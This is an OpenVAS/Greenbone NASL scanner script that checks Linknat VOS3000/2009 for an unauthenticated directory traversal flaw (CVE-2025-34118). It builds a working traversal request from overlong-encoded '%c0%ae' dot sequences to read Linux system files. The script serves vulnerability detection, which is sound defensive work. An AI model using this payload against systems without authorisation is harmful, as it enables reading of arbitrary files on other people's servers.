# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:linknat:vos";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106088");
  script_version("2025-09-09T14:09:45+0000");
  script_tag(name:"last_modification", value:"2025-09-09 14:09:45 +0000 (Tue, 09 Sep 2025)");
  script_tag(name:"creation_date", value:"2016-05-27 12:47:53 +0700 (Fri, 27 May 2016)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2025-34118");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Linknat VOS3000/2009 Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_linknat_vos_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("linknat_vos/detected");

  script_tag(name:"summary", value:"Linknat VOS3000/2009 is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"A directory traversal vulnerability has been found where unicode
encoded characters are not properly validated.");

  script_tag(name:"impact", value:"A unauthenticated remote attacker can read arbitrary system files.");

  script_tag(name:"affected", value:"Linknat VOS3000/2009 version 2.1.1.5, 2.1.1.8 and 2.1.2.0 are
  known to be affected. Other versions might be affected as well.");

  script_tag(name:"solution", value:"External resources are indicating that this flaw got fixed in
  version 2.1.9.07. Please contact the vendor for more information.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20151013001957/http://www.wooyun.org/bugs/wooyun-2010-0145458");
  script_xref(name:"URL", value:"https://www.vulncheck.com/advisories/linknat-vos-manager-path-traversal-file-disclosure");

  exit(0);
}

include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

files = traversal_files("linux");

foreach file (keys(files)) {
  url = "/" + crap(data: "%c0%ae%c0%ae/", length: 13 * 8) + files[file];
  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
